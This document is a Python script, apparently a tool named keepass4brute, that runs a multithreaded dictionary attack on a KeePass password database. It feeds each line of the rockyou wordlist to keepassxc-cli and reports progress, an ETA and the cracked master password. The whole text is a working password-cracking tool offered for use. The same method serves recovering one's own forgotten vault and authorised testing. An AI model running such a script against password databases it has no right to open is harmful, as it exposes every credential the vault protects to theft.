import subprocess
import threading
import time
from queue import Queue

# Configuration
kdbx_file = "file.kdbx"
wordlist_file = "/usr/share/wordlists/rockyou.txt"
max_threads = 100

# Shared state
queue = Queue()
lock = threading.Lock()
start_time = time.time()
n_total = sum(1 for _ in open(wordlist_file, "r", encoding="utf-8", errors="ignore"))
n_tested = 0
found = False

def format_eta(seconds):
    minutes, sec = divmod(int(seconds), 60)
    hours, minutes = divmod(minutes, 60)
    days, hours = divmod(hours, 24)
    weeks, days = divmod(days, 7)

    if weeks > 0:
        return f"{weeks} weeks, {days} days"
    elif days > 0:
        return f"{days} days, {hours} hours"
    elif hours > 0:
        return f"{hours} hours, {minutes} minutes"
    elif minutes > 0:
        return f"{minutes} minutes, {sec} seconds"
    else:
        return f"{sec} seconds"

def try_password():
    global n_tested, found
    while not queue.empty() and not found:
        password = queue.get().strip()
        result = subprocess.run(
            ["keepassxc-cli", "open", kdbx_file],
            input=password.encode(),
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        with lock:
            n_tested += 1
            elapsed = time.time() - start_time
            attempts_per_minute = n_tested * 60 / elapsed if elapsed > 0 else 0
            remaining = n_total - n_tested
            eta = format_eta(remaining * 60 / attempts_per_minute if attempts_per_minute else 0)

            print(f"\r[+] Words tested: {n_tested}/{n_total} - APM: {int(attempts_per_minute)} - ETA: {eta}")
            print(f"[+] Current attempt: {password}")

        if result.returncode == 0:
            with lock:
                found = True
                print(f"\n[*] Password found: {password}")
            break

def main():
    print("ADMinions keepass4brute.py\nStarting...")
    with open(wordlist_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            queue.put(line)

    threads = []
    for _ in range(max_threads):
        t = threading.Thread(target=try_password)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    if not found:
        print("\n[!] Wordlist exhausted, no match found")

main()
